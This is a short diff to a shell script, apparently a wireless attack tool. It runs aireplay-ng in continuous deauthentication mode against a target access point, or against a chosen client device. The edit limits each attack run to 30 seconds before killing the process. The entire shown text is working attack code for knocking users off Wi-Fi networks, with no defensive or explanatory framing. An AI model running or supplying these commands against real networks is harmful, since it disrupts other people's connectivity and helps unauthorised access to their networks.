@@ -28,7 +28,7 @@ iwconfig $IFACE channel $TARGET_CHANNEL
 
 if [ -z "$TARGET_DEVICE" ]
 then
-    aireplay-ng -0 0 -a $TARGET_BSSID $IFACE --ignore-negative-one
+    aireplay-ng -0 0 -a $TARGET_BSSID $IFACE --ignore-negative-one & sleep 30 && killall aireplay-ng
 else
-    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $IFACE --ignore-negative-one
+    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $IFACE --ignore-negative-one & sleep 30 && killall aireplay-ng
 fi
